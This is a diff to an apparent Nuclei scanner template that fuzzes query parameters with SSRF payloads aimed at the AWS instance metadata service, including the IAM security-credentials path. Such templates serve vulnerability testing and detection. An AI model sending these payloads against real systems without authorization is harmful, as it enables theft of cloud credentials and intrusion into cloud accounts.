@@ -4,20 +4,32 @@ info:
   name: SSRF to AWS Metadata Service
   author: 25
   severity: high
-  tags: ssrf, aws, metadata
 
 requests:
   - method: GET
     path:
       # Test multiple common SSRF paths for AWS Metadata Service
-      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/hostname"
-      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/instance-id"
-      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-      - "{{BaseURL}}http://169.254.169.254/latest/meta-data/placement/availability-zone"
+      - "{{BaseURL}}"
 
     timeout: 10 # Adjust as needed for slow responses
 
+    payloads:
+      injection: 
+        - 'http://169.254.169.254/latest/meta-data/hostname'
+        - 'http://169.254.169.254/latest/meta-data/instance-id'
+        - 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
+        - 'http://169.254.169.254/latest/meta-data/placement/availability-zone'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
     # Matchers for identifying AWS metadata responses
+    stop-at-first-match: true
+    matchers-condition: or
     matchers:
       - type: word
         part: body
